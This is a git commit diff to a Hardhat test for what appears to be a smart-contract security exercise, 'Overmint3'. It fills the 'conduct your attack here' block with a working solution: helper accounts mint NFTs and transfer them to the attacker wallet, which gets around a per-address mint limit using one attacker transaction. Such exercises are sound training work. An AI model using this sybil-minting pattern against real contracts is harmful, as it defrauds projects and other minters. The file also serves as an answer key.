65e27cd41acae9dddc3fa2d4e9e99be25397cc12
ksamarin90 <ksamarin90@gmail.com>
2024-04-17 20:10:43 +0400

    security 2

--- test/Overmint3.js
+++ test/Overmint3.js
@@ -1,12 +1,9 @@
-const {
-    time,
-    loadFixture,
-} = require("@nomicfoundation/hardhat-network-helpers");
+const { time, loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
 const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
 const { expect } = require("chai");
 const { ethers } = require("hardhat");
 
-const NAME = "Overmint3"
+const NAME = "Overmint3";
 
 describe(NAME, function () {
     async function setup() {
@@ -22,15 +19,24 @@ describe(NAME, function () {
         let victimContract, attackerWallet;
         before(async function () {
             ({ victimContract, attackerWallet } = await loadFixture(setup));
-        })
+        });
 
         it("conduct your attack here", async function () {
-
+            const [owner, attackerWallet, h1, h2, h3, h4] = await ethers.getSigners();
+            for (const h of [h1, h2, h3, h4]) {
+                await victimContract.connect(h).mint();
+                const tokenId = await victimContract.totalSupply();
+                await victimContract.connect(h).transferFrom(h.address, attackerWallet.address, tokenId);
+            }
+            await victimContract.connect(attackerWallet).mint();
         });
 
         after(async function () {
             expect(await victimContract.balanceOf(attackerWallet.address)).to.be.equal(5);
-            expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.equal(1, "must exploit one transaction");
+            expect(await ethers.provider.getTransactionCount(attackerWallet.address)).to.equal(
+                1,
+                "must exploit one transaction"
+            );
         });
     });
 });
